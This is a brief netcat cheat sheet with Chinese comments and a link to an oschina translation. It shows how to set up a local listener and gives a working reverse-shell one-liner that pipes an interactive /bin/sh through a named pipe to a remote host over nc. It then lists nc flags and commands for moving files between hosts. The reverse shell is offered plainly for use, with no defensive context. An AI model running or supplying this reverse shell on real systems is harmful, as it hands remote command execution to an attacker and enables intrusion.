#http://www.oschina.net/translate/linux-netcat-command

#local
#监听端口
nc -vv -l 12666

#remote
#反向连接
mkfifo /tmp/tmp_fifo
cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc <local_ip> <local_port> > /tmp/tmp_fifo




<ip> <port>   连接端口

-v 显示详细输出
-z 连接成功后立即关闭连接，不等待数据交换
-n 不要使用DNS反向查询

-l 监听端口

-l <port> < <file> 向监听端口输入文件
<ip> <port> > <file> 接收端口数据写入文件（完成了文件下载）

-l <port> > <file> 接收监听数据写入文件
<ip> <port> < <file> 向远程端口写入文件（完成了文件上传）

